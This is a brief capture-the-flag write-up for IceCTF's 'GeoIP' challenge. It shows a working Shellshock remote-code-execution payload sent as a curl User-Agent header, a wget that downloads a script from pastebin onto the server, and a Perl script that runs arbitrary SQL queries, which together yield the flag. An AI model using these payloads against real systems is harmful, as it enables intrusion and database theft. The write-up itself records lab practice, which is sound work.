# GeoIP

The Team found that we could run RCE with this command:
```bash
  curl -v -H "User-Agent: () { test;};echo \"Content-type: text/plain\"; echo; echo;/bin/bash -c 'perl /tmp/bi/DUbHRGqh select \* from 47a6fd2ca39d2b0d6eea1c30008dd889'" http://geocities.vuln.icec.tf/index.cgi
```

so I used pastebin to charge code in it :
```bash
wget -P /tmp/bi/ http://pastebin....
```

used following file:
```perl
  #!/usr/bin/perl
  use DBI;
  $my_cmd = "";
  foreach $argnum(0 .. $#ARGV) {
    $my_cmd = $my_cmd . $ARGV[$argnum] . " ";
  }
  print $my_cmd;
  my $dbh = DBI->connect(
      "dbi:mysql:dbname=geocities;host=icectf_mariadb",
      "geocities",
      "geocities",
      { RaiseError => 1 },
  ) or die $DBI::errstr;
  my $sth = $dbh->prepare($my_cmd);
  $sth->execute();
  my $row;
  while ($row = $sth->fetchrow_arrayref()) {
      print "@$row\n";
  }
  $sth->finish();
  $dbh->disconnect();

```

then could query the db easily using the script and all the arguments of the perl script as the mysql query

```bash
  curl -v -H "User-Agent: () { test;};echo \"Content-type: text/plain\"; echo; echo;/bin/bash -c 'perl /tmp/bi/DUbHRGqh sql_query'" http://geocities.vuln.icec.tf/index.cgi

```

Results of the queries:

```
show tables;
  Posts
  47a6fd2ca39d2b0d6eea1c30008dd889

(note that * must be escaped in bash)
Select \* from 47a6fd2ca39d2b0d6eea1c30008dd889;
  IceCTF{7h3_g0s_WEr3_5UpeR_wE1Rd_mY_3ye5_HUr7}
```

We got the flag !
